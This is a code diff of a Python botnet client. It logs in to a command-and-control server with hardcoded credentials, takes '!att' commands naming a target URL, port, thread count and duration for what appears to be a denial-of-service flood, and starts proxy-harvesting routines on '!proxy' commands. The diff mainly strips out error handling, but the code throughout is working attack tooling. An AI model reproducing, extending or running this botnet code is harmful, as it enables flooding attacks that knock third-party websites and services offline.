@@ -311,6 +311,7 @@ def iroxy():
         pf.write(pyy + '\n')
     pf.close()
 
+
 def main():
     while True:
         s = None
@@ -329,41 +330,34 @@ def main():
                     except:
                         pass
                 sleep(5)
-
         try:
             while True:
-                try:
-                    data = s.recv(1024)
-                    if not data:
-                        print("Disconnected from server.")
-                        break
-                except Exception as e:
-                    print(f"Error receiving data: {e}")
+                data = s.recv(1024)
+                if not data:
+                    print("Disconnected from server.")
                     break
-
                 if b"Username" in data:
-                    s.send(b"glitcham")
+                    s.send("kediam".encode())
                 elif b"Password" in data:
-                    s.send(b"FSOCIETY")
+                    s.send("FSOCIETY".encode())
                 else:
                     try:
                         c2 = data.decode().strip()
-                        parts = c2.split()
-                        if len(parts) > 6 and parts[0] == '!att':
+                        if c2.split()[0] == '!att':
                             print(c2)
-                            method = parts[1]
-                            url = parts[2]
-                            port = int(parts[3])
-                            threads = int(parts[4])
-                            rpc = int(parts[5])
-                            timme = int(parts[6])
+                            method = str(c2.split()[1])
+                            url = str(c2.split()[2])
+                            port = int(c2.split()[3])
+                            threads = int(c2.split()[4])
+                            rpc = int(c2.split()[5])
+                            timme = int(c2.split()[6])
                             timer = time() + timme
-                        elif parts[0] == '!proxy':
+                        elif c2.split()[0] == '!proxy':
                             thr(target=socks5geter).start()
-                        elif parts[0] == '!proxyir':
+                        elif c2.split()[0] == '!proxyir':
                             thr(target=iroxy).start()
-                    except Exception as e:
-                        print(f"Error processing command: {e}")
+                    except:
+                        pass
                 try:
                     ua = fake.user_agent()
                     ctx = create_default_context(cafile=where())
